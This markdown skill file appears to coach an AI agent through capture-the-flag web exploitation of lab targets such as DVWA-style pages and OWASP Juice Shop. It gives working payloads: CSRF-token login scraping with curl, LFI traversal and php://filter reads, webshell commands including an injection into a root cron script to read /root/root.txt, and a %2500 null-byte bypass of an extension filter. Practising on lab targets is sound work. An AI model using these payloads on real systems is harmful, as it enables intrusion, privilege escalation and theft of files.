---
id: web-app
title: Web-app exploitation — sessions, CSRF, LFI, webshell & filter traps
triggers: [login, csrf, user_token, ?page=, ?c=, LFI, php://filter, %2500, cookie jar, 302, form:]
---

## Sessions & logins

- Session state lives in ONE cookie jar: `curl -c /tmp/jar -b /tmp/jar`
  on EVERY request — a fresh `-c` file per attempt discards the login you
  just did. Verify the login BEFORE exploiting: fetch a protected page
  (`/index.php`), a 302 back to login means the POST failed.
- Login forms often carry a CSRF token — a silent auth failure (every
  response is a redirect/empty page despite correct creds) usually means a
  missing hidden field. Fetch the form, extract it, POST it along:
  `tok=$(curl -s -c jar LOGIN | grep -oP "user_token' value='\K[^']+")`
  then `-d "username=..&password=..&user_token=$tok&Login=Login"`.
- A POST that returns an EMPTY body is usually a 302 SUCCESS, not a
  failure — the login worked and the page lives behind the redirect.
  Follow it: `curl -sL -c /tmp/jar -b /tmp/jar -d '…' URL` or GET `/`
  with the same jar. Grepping an empty body for the flag is a dead turn.
- Retrying the SAME payload with cosmetic changes (new cookie file,
  added -L, same ../ count) is a loop, not iteration — change exactly
  ONE variable per attempt and keep the rest fixed.

## LFI methodology — in this order, never skip the sanity check

1. `?page=../../../../etc/passwd` proves traversal works at all
2. empty page / same page back → ADD more `../` (include() resolves
   relative to the vulnerable script's dir — an endpoint under
   /vulnerabilities/x/ needs 4-6 levels to reach filesystem root)
3. absolute `?page=/absolute/path/file` skips the depth game entirely
4. `php://filter/convert.base64-encode/resource=<file>` when include()
   executes/parses the file instead of printing it

## Webshell URL traps (?c= param style)

- NEVER append `2>&1` to a `?c=` URL — `&` splits the query, PHP only
  receives `cmd 2>` and returns an EMPTY body while the command "works".
  Stdout comes back anyway; just drop it.
- Same for unquoted `>` in the payload: `?c=echo X > /tmp/f` makes the
  REMOTE shell apply the redirect to the echo — to inject a line that
  itself contains `>`, quote the whole payload:
  `?c=echo "cat /root/root.txt > /out" >> /opt/cron-script.sh`
- `cat` on a file returning EMPTY (with other paths printing fine) is a
  quoting/URL artifact, not missing content — suspect the `&`, not the fs.
- A "shell" on a phantom IP is never worth a second try: if a target IP
  wasn't in tool output, it doesn't exist — re-derive with `ip route` +
  `nmap -sn` instead.

## Static-file extension filters (Juice Shop /ftp/ and friends)

- A dir that "Only allows .md/.pdf" checks the REQUESTED name, then stats
  the resolved path — smuggle a terminator: `/ftp/flag1.txt%2500.md`.
  `%25`→`%` survives the extension check (name ends `.md`), the second
  decode yields `flag1.txt\0.md` and the FS truncates at NUL → flag served.
- Symptom read: a direct fetch 403s with the filter error while the dir
  LISTING hides the file entirely — the file exists, the filter hides it.
  `file.md` returning `ENOENT stat '/path/file.md'` proves the check runs
  before the stat → encoding tricks reach the FS layer untouched.
- Same trick family: `file%00.md` (single decode layers), `file.md%00.txt`,
  `..;/` / `..\\` traversal when the check anchors on the wrong segment.
- Juice Shop specifics: `/ftp/quarantine/` lists `.url` bait files; the
  easter egg `eastere.gg` needs the identical `%2500.md` bypass.
